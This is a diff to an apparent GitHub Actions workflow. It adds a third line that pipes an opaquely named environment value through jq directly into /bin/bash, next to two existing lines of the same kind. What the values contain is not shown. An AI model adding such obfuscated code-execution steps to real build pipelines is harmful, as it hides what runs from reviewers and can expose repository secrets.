@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$tns255" | jq -r .ev08601 | /bin/bash
           echo $i086 | jq -r .sd90724 | /bin/bash
+          echo $sr03034 | jq -r .moapi8419 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
